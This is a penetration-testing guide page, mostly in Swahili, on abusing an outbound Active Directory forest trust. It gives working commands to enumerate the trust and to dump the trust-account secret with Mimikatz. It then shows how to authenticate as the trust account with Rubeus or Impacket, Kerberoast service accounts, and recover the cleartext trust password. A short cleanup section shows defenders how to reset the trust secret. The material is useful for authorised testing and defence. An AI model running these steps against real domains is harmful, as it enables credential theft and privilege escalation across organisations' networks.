# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Katika hali hii **domain yako** inatoa **trust** kwa baadhi ya **privileges** kwa principals kutoka **domain/forest** nyingine.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Ikiwa una AD module inapatikana, kagua pia **Trusted Domain Object (TDO)** moja kwa moja. Hii inakupa data ghafi ya trust inayotegemea LDAP ambayo baadaye utaihitaji unapoamua kama njia rahisi ni **FSP/group abuse** au **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Unapaswa pia kuorodhesha mahali ambapo principals za kigeni kutoka `CN=ForeignSecurityPrincipals` zilipewa access kweli. Ushindi wa kawaida ni:

- **Local admin** kwenye server/DC katika domain yako ya sasa
- Uanachama katika **custom domain group** ambayo ina ACLs juu ya users/computers/GPOs
- Haki za kurekebisha **computer objects**, ambazo baadaye zinaweza kuwa [RBCD](resource-based-constrained-delegation.md) ikiwa trust configuration inaruhusu

## Trust Account Attack

Wakati one-way trust inaundwa kutoka domain/forest **B** kwenda domain/forest **A** (**B trusts A**), **trust account** kwa **B** huundwa katika **A**. Katika outbound-trust view ya **A**, hii ni muhimu kwa sababu ukipata compromise ya **B** baadaye (the trusting side), unaweza dump trust secret hapo na authenticate kurudi **A** kama `B$`.

Sehemu muhimu ya kuelewa hapa ni kwamba password na Kerberos material kwa trust account hiyo zinaweza kutolewa kutoka kwa Domain Controller katika domain ya **trusting** kwa kutumia:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hii hufanya kazi kwa sababu akaunti ya trust iliyoundwa katika domain **trusted** ni principal iliyowezeshwa ambayo huishia na baseline rights za mtumiaji wa kawaida wa domain huko. Hilo mara nyingi hutosha kuanza kuenumerate LDAP, kuomba tickets, na kupata njia inayofuata ya escalation.

Katika scenario ambapo `ext.local` ni domain ya **trusting** na `root.local` ni domain ya **trusted**, akaunti ya mtumiaji inayoitwa `EXT$` huundwa ndani ya `root.local`. Dumping trust keys kutoka `ext.local` hufichua credentials ambazo zinaweza kutumika kama `root.local\EXT$` dhidi ya `root.local`:
```bash
lsadump::trust /patch
```
Kufuatia hili, tumia ufunguo uliotolewa wa **RC4** kuthibitisha kama `root.local\EXT$` ndani ya `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Kisha hesabia trusted domain kama principal huyo, kwa mfano kwa Kerberoasting SPN yenye thamani kubwa katika `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Kutoka Linux

Kama umerecover **RC4** trust-account key, wazo lilelile linafanya kazi kutoka Linux na Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Ikiwa **RC4** haikubaliwi, rudi kwenye **cleartext password** iliyorejeshwa (au **AES** keys zilizo derive) na utumie tena kawaida [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) na [Kerberoast](kerberoast.md) workflows kutoka kwenye foothold hiyo.

### Key material gotchas

Usichanganye **trust keys** na **trust-account credentials**:

- Katika one-way trust, pande zote mbili huhifadhi **TDO**, lakini **`EXT$` user account** halisi ipo tu katika trusted domain.
- Nenosiri la trust-account la sasa linaonekana kwenye TDO trust secret (`NewPassword` / current trust key).
- **RC4** trust key ndio artifact rahisi zaidi kutumia tena kwa `asktgt` kama trust account; katika default setups hii kwa kawaida ndiyo enctype inayofanya kazi kwa sababu trust account mara nyingi haina tupu `msDS-SupportedEncryptionTypes`.
- Ukifikiria kwa upande wa **AES trust keys**, kumbuka hazibadilishaniki na trust-account AES keys kwa sababu salts ni tofauti.

Kwa hiyo, kwa technique kwenye ukurasa huu, pendelea ama dumped **RC4** material au recovered **cleartext** password.

### Gathering cleartext trust password

Katika flow iliyopita ilitumika trust hash badala ya **cleartext password** (ambayo pia **dumped by mimikatz**).

Cleartext password inaweza kupatikana kwa kubadilisha output ya \[ CLEAR ] kutoka mimikatz kutoka hexadecimal na kuondoa null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Wakati mwingine wakati wa kuunda trust relationship, user lazima aingize password kwa ajili ya trust. Katika demonstration hii, key ni original trust password na kwa hiyo inaweza kusomeka na binadamu. Key inapozunguka (default: kila siku 30), cleartext kwa kawaida huacha kuwa human readable lakini bado technically inaweza kutumika.

Cleartext password inaweza kutumika kufanya regular authentication kama trust account, kama mbadala wa kuomba TGT kwa kutumia Kerberos secret key ya trust account. Hapa, querying `root.local` kutoka `ext.local` kwa members wa `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts ni awkward principals. Interactive logons kama **RUNAS / console / RDP** si expected path hapa, na **NTLM** authentication attempts zinaweza kushindwa kwa `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Panga kwa **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) badala yake.

### Persistence / cleanup note

Ikiwa defenders watatambua kuwa trusting domain imecompromise, wanapaswa ku-rotate trust secret kwenye **pande zote mbili** kwa `netdom trust ... /resetOneSide ...`. Kutoka kwa operator perspective hii ni muhimu kwa sababu **manual reset invalidates old trust material immediately**, wakati normal trust-password rotation huacha current/previous values zikibaki wakati wa rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Marejeo

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
